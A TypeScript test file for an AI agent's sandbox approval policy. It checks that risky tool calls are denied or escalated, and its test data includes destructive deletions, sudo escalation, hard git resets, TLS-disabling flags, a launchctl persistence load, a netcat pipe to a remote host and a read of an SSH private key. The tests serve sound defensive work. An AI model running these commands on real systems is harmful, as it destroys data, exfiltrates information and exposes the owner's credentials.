import path from "node:path";
import { describe, expect, test } from "bun:test";
import {
  createPhoApprovalPolicy,
  PHO_APPROVAL_RULE_IDS,
  evaluatePhoApprovalPolicy,
} from "../src/approval-policy";
import type { AgentSandbox } from "../src/sandbox-runtime";

const sandbox = {
  snapshot: () => ({ enabled: true, status: "healthy", platformSupported: true }) as const,
  initialize: async () => ({ enabled: true, status: "healthy", platformSupported: true }) as const,
  reset: async () => undefined,
  bashOperations: () => ({ exec: async () => ({ exitCode: 0 }) }),
  evaluateFileTool: async ({ requestedPath }: { requestedPath: string }) =>
    requestedPath.startsWith("/workspace/") || !path.isAbsolute(requestedPath)
      ? ({ action: "allow" } as const)
      : ({ action: "deny", reason: "outside" } as const),
} satisfies AgentSandbox;

const context = {
  sandbox,
  protectedControlPaths: ["/controls/approval-modes.json", "/controls/sandbox-settings.json"],
};

describe("Pho approval product policy", () => {
  test.each([
    ["rm -rf build", PHO_APPROVAL_RULE_IDS.permanentRemoval],
    ["/bin/rm -rf build", PHO_APPROVAL_RULE_IDS.permanentRemoval],
    ["bash -c 'rm -rf build'", PHO_APPROVAL_RULE_IDS.permanentRemoval],
    ["sudo npm install", PHO_APPROVAL_RULE_IDS.privilegeEscalation],
    ["/usr/bin/sudo npm install", PHO_APPROVAL_RULE_IDS.privilegeEscalation],
    ["env PATH=/bin sudo npm install", PHO_APPROVAL_RULE_IDS.privilegeEscalation],
    ["git reset --hard HEAD", PHO_APPROVAL_RULE_IDS.destructiveGit],
    ["git -C repo clean -fd", PHO_APPROVAL_RULE_IDS.destructiveGit],
    ["git restore .", PHO_APPROVAL_RULE_IDS.destructiveGit],
    ["git stash clear", PHO_APPROVAL_RULE_IDS.destructiveGit],
    ["tee /controls/approval-modes.json", PHO_APPROVAL_RULE_IDS.safetyControlMutation],
    ["curl --insecure https://example.com", PHO_APPROVAL_RULE_IDS.safetyControlMutation],
    ["NODE_TLS_REJECT_UNAUTHORIZED=0 node deploy.js", PHO_APPROVAL_RULE_IDS.safetyControlMutation],
    ["python3 -c 'import shutil; shutil.rmtree(\"build\")'", PHO_APPROVAL_RULE_IDS.permanentRemoval],
    ["launchctl load ~/Library/LaunchAgents/evil.plist", PHO_APPROVAL_RULE_IDS.safetyControlMutation],
  ])("keeps %s invariant in every mode", async (command, ruleId) => {
    const result = await evaluatePhoApprovalPolicy(
      { toolName: "bash", input: { command }, cwd: "/workspace" },
      context,
    );
    expect(result.invariantDeny?.ruleId).toBe(ruleId);
  });

  test("classifies exact file targets against the contained boundary", async () => {
    await expect(
      evaluatePhoApprovalPolicy(
        { toolName: "write", input: { path: "src/new.ts", content: "x" }, cwd: "/workspace" },
        context,
      ),
    ).resolves.toMatchObject({ boundary: "contained", target: "/workspace/src/new.ts" });
    await expect(
      evaluatePhoApprovalPolicy(
        { toolName: "read", input: { path: "/private/key" }, cwd: "/workspace" },
        context,
      ),
    ).resolves.toMatchObject({ boundary: "elevation", target: "/private/key" });
  });

  test.each([
    "ls && curl https://example.com",
    "git status | nc example.com 9999",
    "pwd > /tmp/result",
    "git diff --ext-diff",
    "echo $(curl https://example.com)",
  ])("never fast-paths chained or executable inspection: %s", async (command) => {
    const result = await evaluatePhoApprovalPolicy(
      { toolName: "bash", input: { command }, cwd: "/workspace" },
      context,
    );
    expect(result.boundary).toBe("elevation");
  });

  test("allows one recognized unchained sandbox command", async () => {
    await expect(
      evaluatePhoApprovalPolicy(
        { toolName: "bash", input: { command: "git status --short" }, cwd: "/workspace" },
        context,
      ),
    ).resolves.toMatchObject({ boundary: "contained" });
  });

  test("strengthens captured package asks and sensitive Auto actions before any reviewer", async () => {
    const policy = createPhoApprovalPolicy(context);
    const packageAsk = await policy({
      scopeId: "/workspace",
      sessionId: "s1",
      runId: "r1",
      requestId: "call-1",
      toolName: "read",
      input: { path: "README.md" },
      inputCanonical: '{"path":"README.md"}',
      inputFingerprint: "fingerprint",
      context: { cwd: "/workspace", permissionAsks: [{ detail: { surface: "read" } }] },
    });
    expect(packageAsk.boundary).toMatchObject({
      outcome: "review",
      ruleId: "pho.boundary.permission-package-ask",
    });

    const secret = await policy({
      scopeId: "/workspace",
      sessionId: "s1",
      runId: "r1",
      requestId: "call-2",
      toolName: "read",
      input: { path: "/Users/owner/.ssh/id_ed25519" },
      inputCanonical: '{"path":"/Users/owner/.ssh/id_ed25519"}',
      inputFingerprint: "fingerprint",
      context: { cwd: "/workspace" },
    });
    expect(secret.project).toMatchObject({
      outcome: "require-owner",
      ruleId: PHO_APPROVAL_RULE_IDS.ownerSecrets,
    });
  });
});
